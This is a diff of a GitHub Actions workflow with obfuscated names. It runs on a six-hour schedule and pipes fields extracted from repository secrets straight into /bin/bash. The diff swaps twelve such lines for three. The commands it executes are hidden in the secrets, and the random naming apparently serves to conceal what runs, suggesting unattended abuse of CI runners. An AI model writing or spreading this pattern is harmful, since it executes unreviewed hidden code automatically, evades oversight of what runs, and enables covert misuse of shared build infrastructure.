@@ -2,27 +2,19 @@ name: zengshunshen6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 2/6 * * *'
+    - cron: '18 1/6 * * *'
 
-jobs:  # 6435
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zengshunshen6789
         env:
-          ghhnr06: ${{ secrets.ghhnr06 }}
+          yf5: ${{ secrets.yf5 }}
         run: |
-          echo $ghhnr06 | jq -r .vkkc4 | /bin/bash
-          echo $ubcst0 | jq -r .kvd84569 | /bin/bash
-          echo $iyyn07470 | jq -r .hkmw83811 | /bin/bash
-          echo $voe9 | jq -r .nfdu1 | /bin/bash
-          echo $fg01917 | jq -r .gp2062 | /bin/bash
-          echo $xixh89329 | jq -r .k0 | /bin/bash
-          echo $mr75 | jq -r .dtot561 | /bin/bash
-          echo $wh03 | jq -r .f96 | /bin/bash
-          echo $selcm16347 | jq -r .g09 | /bin/bash
-          echo $wquzg74689 | jq -r .gaivb1 | /bin/bash
-          echo $ncf7 | jq -r .fmv865 | /bin/bash
-          echo $sujzm43 | jq -r .vaf28927 | /bin/bash
+          echo $yf5 | jq -r .plvf274 | /bin/bash
+          echo $hz1123 | jq -r .we398 | /bin/bash
+          echo $j20599 | jq -r .oyh788 | /bin/bash
 
